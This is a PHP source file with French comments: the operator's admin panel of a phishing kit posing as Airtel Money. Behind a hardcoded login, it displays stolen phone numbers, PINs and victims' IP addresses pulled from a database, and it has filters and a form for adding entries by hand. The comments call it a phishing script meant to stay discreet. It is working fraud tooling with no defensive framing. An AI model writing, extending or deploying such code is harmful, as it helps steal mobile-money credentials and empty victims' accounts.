<?php
// Désactiver l'affichage des erreurs PHP pour les visiteurs non authentifiés
// Ceci est crucial pour un script de phishing afin de rester discret.
ini_set('display_errors', 0);
error_reporting(0);

// --- Configuration d'authentification pour le panneau admin ---
$admin_username = 'adminhacker'; // Nom d'utilisateur pour se connecter au panneau
$admin_password = 'supersecret123'; // Mot de passe pour se connecter au panneau (À CHANGER POUR UN MOT DE PASSE SÉCURISÉ !)

// --- Configuration de la Base de Données MariaDB ---
define('DB_HOST', 'localhost');
define('DB_NAME', 'ONLY.NBA');
define('DB_USER', 'nathanaelhacker6NBA');
define('DB_PASS', 'nathanael1209ba');

// --- Logique d'authentification et de session ---
session_start(); // Démarre la session PHP pour gérer l'authentification

$error_message = ''; // Message d'erreur pour la connexion
$success_message_add = ''; // Message de succès pour l'ajout
$error_message_add = ''; // Message d'erreur pour l'ajout

// Logique de déconnexion
if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header('Location: admin_panel.php');
    exit();
}

// Si le formulaire de connexion a été soumis
if (isset($_POST['username']) && isset($_POST['password'])) {
    $input_username = $_POST['username'];
    $input_password = $_POST['password'];

    if ($input_username === $admin_username && $input_password === $admin_password) {
        $_SESSION['authenticated'] = true;
    } else {
        $error_message = "Nom d'utilisateur ou mot de passe incorrect.";
    }
}

// Si l'utilisateur n'est PAS authentifié, afficher le formulaire de connexion et arrêter
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Accès Administrateur Airtel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        /* Couleurs et typographie Airtel */
        body { font-family: 'Inter', sans-serif; }
        .airtel-red-500 { background-color: #E4002B; } /* Rouge vif d'Airtel */
        .airtel-red-600 { background-color: #B00021; } /* Rouge plus foncé pour le hover */
        .airtel-text-red-500 { color: #E4002B; }
        .airtel-border-red-500 { border-color: #E4002B; }

        /* Styles génériques pour les éléments interactifs */
        input:focus, button:focus, select:focus {
            outline: none !important;
            border-color: #E4002B !important;
            box-shadow: 0 0 0 3px rgba(228, 0, 43, 0.4) !important;
        }
        /* Style des boutons pour un look plus "Airtel" */
        .btn-airtel {
            @apply rounded-full shadow-md transition duration-300 transform hover:scale-105;
        }
    </style>
</head>
<body class="bg-gray-50 flex items-center justify-center min-h-screen p-4">
    <div class="bg-white p-8 rounded-xl shadow-2xl w-full max-w-sm border-t-8 border-airtel-red-500 transform transition duration-500 hover:scale-[1.02]">
        <div class="flex flex-col items-center mb-6">
            <img src="https://placehold.co/80x80/E4002B/FFFFFF?text=Airtel" alt="Logo Airtel" class="h-20 w-20 rounded-full mb-3 border-4 border-gray-200 shadow-inner">
            <h2 class="text-4xl font-extrabold text-center text-airtel-text-red-500">Airtel Money</h2>
            <p class="text-gray-600 text-center mt-2">Panneau d'Administration</p>
        </div>
        
        <?php if (!empty($error_message)): ?>
            <p class="bg-red-100 text-red-700 p-3 rounded-lg text-center mb-4 border border-red-200"><?php echo $error_message; ?></p>
        <?php endif; ?>

        <form method="POST" action="">
            <div class="mb-5">
                <label for="username" class="block text-gray-700 text-sm font-semibold mb-2">Nom d'utilisateur:</label>
                <div class="relative">
                    <input type="text" id="username" name="username" class="pl-10 shadow-sm appearance-none border rounded-lg w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-airtel-red-500" required placeholder="adminhacker">
                    <i class="fas fa-user absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                </div>
            </div>
            <div class="mb-6">
                <label for="password" class="block text-gray-700 text-sm font-semibold mb-2">Mot de passe:</label>
                <div class="relative">
                    <input type="password" id="password" name="password" class="pl-10 shadow-sm appearance-none border rounded-lg w-full py-3 px-3 text-gray-700 mb-3 leading-tight focus:outline-none focus:ring-2 focus:ring-airtel-red-500" required placeholder="••••••••">
                    <i class="fas fa-lock absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                </div>
            </div>
            <button type="submit" class="airtel-red-500 hover:airtel-red-600 text-white font-bold py-3 px-4 w-full btn-airtel focus:outline-none focus:shadow-outline">
                <i class="fas fa-sign-in-alt mr-2"></i>Se connecter
            </button>
        </form>
        <p class="text-center text-gray-500 text-xs mt-6">
            &copy; <?php echo date("Y"); ?> Airtel Money. Tous droits réservés.
        </p>
    </div>
</body>
</html>
<?php
    exit(); // Arrête l'exécution du script si non authentifié
}

// --- Logique d'ajout de nouvelle entrée (si authentifié) ---
if (isset($_POST['add_phone_number']) && isset($_POST['add_pin_code'])) {
    $addPhoneNumber = htmlspecialchars($_POST['add_phone_number']);
    $addPinCode = htmlspecialchars($_POST['add_pin_code']);
    $addIpAddress = $_SERVER['REMOTE_ADDR']; // L'IP de l'admin ajoutant l'entrée
    $addTimestamp = date('Y-m-d H:i:s');

    try {
        $dsn = 'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4';
        $pdo = new PDO($dsn, DB_USER, DB_PASS);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        $stmt = $pdo->prepare("INSERT INTO credentials (phone_number, pin_code, ip_address, timestamp) VALUES (?, ?, ?, ?)");
        $stmt->execute([$addPhoneNumber, $addPinCode, $addIpAddress, $addTimestamp]);
        $success_message_add = "Nouvelle entrée ajoutée avec succès !";

    } catch (PDOException $e) {
        $error_message_add = "Erreur lors de l'ajout : " . $e->getMessage();
        error_log("[" . date('Y-m-d H:i:s') . "] DB Admin Add Error: " . $e->getMessage() . "\n", 3, 'admin_db_error.log');
    }
}

// Si l'utilisateur est authentifié, afficher les données
$credentials = []; // Tableau pour stocker les données récupérées
$error_message_db = ''; // Message d'erreur pour la récupération des données

try {
    // Connexion à la base de données
    $dsn = 'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4';
    $pdo = new PDO($dsn, DB_USER, DB_PASS);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Récupération des données
    $stmt = $pdo->query("SELECT id, phone_number, pin_code, ip_address, timestamp FROM credentials ORDER BY timestamp DESC");
    $credentials = $stmt->fetchAll(PDO::FETCH_ASSOC);

} catch (PDOException $e) {
    $error_message_db = "Erreur de base de données : " . $e->getMessage();
    error_log("[" . date('Y-m-d H:i:s') . "] DB Admin Panel Error: " . $e->getMessage() . "\n", 3, 'admin_db_error.log');
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panneau d'Administration - Airtel Money</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        /* Couleurs et typographie Airtel */
        body { font-family: 'Inter', sans-serif; }
        .airtel-red-500 { background-color: #E4002B; } /* Rouge vif d'Airtel */
        .airtel-red-600 { background-color: #B00021; } /* Rouge plus foncé pour le hover */
        .airtel-text-red-500 { color: #E4002B; }
        .airtel-border-red-500 { border-color: #E4002B; }

        /* Styles génériques pour les éléments interactifs */
        input:focus, button:focus, select:focus {
            outline: none !important;
            border-color: #E4002B !important;
            box-shadow: 0 0 0 3px rgba(228, 0, 43, 0.4) !important;
        }
        /* Style des boutons pour un look plus "Airtel" */
        .btn-airtel {
            @apply rounded-full shadow-md transition duration-300 transform hover:scale-105;
        }
        /* Styles spécifiques pour le tableau */
        #credentials_table th {
            background-color: #E4002B; /* En-tête de tableau rouge Airtel */
        }
        #credentials_table tbody tr:nth-child(even) {
            background-color: #f8f8f8; /* Bandes alternées pour la lisibilité */
        }
        #credentials_table tbody tr:hover {
            background-color: #ffebee; /* Légère couleur au survol */
        }
    </style>
</head>
<body class="bg-gray-50 text-gray-900">
    <div class="container mx-auto p-6 sm:p-10">
        <!-- En-tête du panneau d'administration -->
        <div class="flex flex-col sm:flex-row justify-between items-center mb-8 airtel-red-500 p-5 rounded-xl shadow-lg text-white">
            <div class="flex items-center mb-4 sm:mb-0">
                <img src="https://placehold.co/70x70/FFFFFF/E4002B?text=AM" alt="Logo Airtel Money Admin" class="h-16 w-16 rounded-full mr-4 border-3 border-white shadow-md">
                <h1 class="text-3xl sm:text-4xl font-extrabold">Panneau Admin Airtel Money</h1>
            </div>
            <a href="?logout=true" class="bg-airtel-red-600 hover:bg-airtel-red-700 text-white font-bold py-2 px-6 rounded-full btn-airtel">
                <i class="fas fa-sign-out-alt mr-2"></i>Déconnexion
            </a>
        </div>

        <?php if (!empty($success_message_add)): ?>
            <div class="bg-green-100 border-l-4 border-green-500 text-green-700 p-4 mb-6 rounded-lg shadow-md" role="alert">
                <p class="font-bold">Succès !</p>
                <p><?php echo $success_message_add; ?></p>
            </div>
        <?php endif; ?>

        <?php if (!empty($error_message_add)): ?>
            <div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-6 rounded-lg shadow-md" role="alert">
                <p class="font-bold">Erreur :</p>
                <p><?php echo $error_message_add; ?></p>
            </div>
        <?php endif; ?>

        <?php if (!empty($error_message_db)): ?>
            <div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-6 rounded-lg shadow-md" role="alert">
                <p class="font-bold">Erreur de base de données :</p>
                <p><?php echo $error_message_db; ?></p>
            </div>
        <?php endif; ?>

        <!-- Section "Ajouter une Nouvelle Entrée" -->
        <div class="bg-white rounded-xl shadow-lg p-6 mb-8 border-t-8 border-airtel-red-500">
            <h2 class="text-2xl font-bold text-airtel-text-red-500 mb-5 border-b pb-3 border-gray-200">Ajouter une Nouvelle Entrée Manuellement</h2>
            <form method="POST" action="">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                    <div>
                        <label for="add_phone_number" class="block text-gray-700 text-sm font-semibold mb-2">Numéro de Téléphone:</label>
                        <div class="relative">
                            <input type="tel" id="add_phone_number" name="add_phone_number" class="pl-10 shadow-sm appearance-none border rounded-lg w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-airtel-red-500" required placeholder="Ex: 07XXXXXXXX">
                            <i class="fas fa-phone absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                        </div>
                    </div>
                    <div>
                        <label for="add_pin_code" class="block text-gray-700 text-sm font-semibold mb-2">PIN:</label>
                        <div class="relative">
                            <input type="password" id="add_pin_code" name="add_pin_code" class="pl-10 shadow-sm appearance-none border rounded-lg w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-airtel-red-500" required placeholder="Ex: 1234">
                            <i class="fas fa-key absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                        </div>
                    </div>
                </div>
                <button type="submit" name="add_entry_submit" class="airtel-red-500 hover:airtel-red-600 text-white font-bold py-3 px-6 btn-airtel">
                    <i class="fas fa-plus-circle mr-2"></i>Ajouter l'entrée
                </button>
            </form>
        </div>

        <!-- Section de Filtrage -->
        <div class="bg-white rounded-xl shadow-lg p-6 mb-8 border-t-8 border-airtel-red-500">
            <h2 class="text-2xl font-bold text-airtel-text-red-500 mb-5 border-b pb-3 border-gray-200">Filtrer les Données</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                    <label for="filter_phone" class="block text-gray-700 text-sm font-semibold mb-2">Filtrer par Numéro de Téléphone:</label>
                    <div class="relative">
                        <input type="text" id="filter_phone" class="pl-10 shadow-sm appearance-none border rounded-lg w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-airtel-red-500" placeholder="Entrez un numéro...">
                        <i class="fas fa-filter absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                    </div>
                </div>
                <div>
                    <label for="filter_ip" class="block text-gray-700 text-sm font-semibold mb-2">Filtrer par Adresse IP:</label>
                    <div class="relative">
                        <input type="text" id="filter_ip" class="pl-10 shadow-sm appearance-none border rounded-lg w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-airtel-red-500" placeholder="Entrez une IP...">
                        <i class="fas fa-globe absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                    </div>
                </div>
            </div>
        </div>

        <!-- Tableau des données récupérées -->
        <?php if (empty($credentials)): ?>
            <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4 mb-6 rounded-lg shadow-md" role="alert">
                <p class="font-bold">Aucune donnée pour l'instant.</p>
                <p>Le formulaire de phishing n'a pas encore été soumis ou les données n'ont pas été enregistrées.</p>
            </div>
        <?php else: ?>
            <div class="bg-white rounded-xl shadow-lg overflow-hidden border-t-8 border-airtel-red-500">
                <div class="overflow-x-auto">
                    <table class="min-w-full leading-normal" id="credentials_table">
                        <thead>
                            <tr class="airtel-red-500 text-white uppercase text-sm leading-normal">
                                <th class="py-4 px-6 text-left">ID</th>
                                <th class="py-4 px-6 text-left">Numéro de Téléphone</th>
                                <th class="py-4 px-6 text-left">PIN</th>
                                <th class="py-4 px-6 text-left">Adresse IP</th>
                                <th class="py-4 px-6 text-left">Date & Heure</th>
                            </tr>
                        </thead>
                        <tbody class="text-gray-700 text-sm">
                            <?php foreach ($credentials as $cred): ?>
                            <tr class="border-b border-gray-100 hover:bg-red-50 transition duration-150 ease-in-out">
                                <td class="py-3 px-6 text-left whitespace-nowrap font-medium"><?php echo htmlspecialchars($cred['id']); ?></td>
                                <td class="py-3 px-6 text-left phone-cell"><?php echo htmlspecialchars($cred['phone_number']); ?></td>
                                <td class="py-3 px-6 text-left font-bold text-lg text-airtel-text-red-500 pin-cell"><?php echo htmlspecialchars($cred['pin_code']); ?></td>
                                <td class="py-3 px-6 text-left ip-cell"><?php echo htmlspecialchars($cred['ip_address']); ?></td>
                                <td class="py-3 px-6 text-left whitespace-nowrap text-gray-500 text-xs"><?php echo htmlspecialchars($cred['timestamp']); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <!-- Script JavaScript pour le Filtrage -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const filterPhoneInput = document.getElementById('filter_phone');
            const filterIpInput = document.getElementById('filter_ip');
            const credentialsTableBody = document.querySelector('#credentials_table tbody');
            const tableRows = credentialsTableBody ? credentialsTableBody.querySelectorAll('tr') : [];

            function applyFilter() {
                const phoneFilter = filterPhoneInput.value.toLowerCase();
                const ipFilter = filterIpInput.value.toLowerCase();

                tableRows.forEach(row => {
                    const phoneCell = row.querySelector('.phone-cell').textContent.toLowerCase();
                    const ipCell = row.querySelector('.ip-cell').textContent.toLowerCase();

                    const phoneMatch = phoneCell.includes(phoneFilter);
                    const ipMatch = ipCell.includes(ipFilter);

                    if (phoneMatch && ipMatch) {
                        row.style.display = ''; // Afficher la ligne
                    } else {
                        row.style.display = 'none'; // Masquer la ligne
                    }
                });
            }

            // Écouteurs d'événements pour le filtrage
            if (filterPhoneInput) {
                filterPhoneInput.addEventListener('keyup', applyFilter);
            }
            if (filterIpInput) {
                filterIpInput.addEventListener('keyup', applyFilter);
            }
        });
    </script>
</body>
</html>
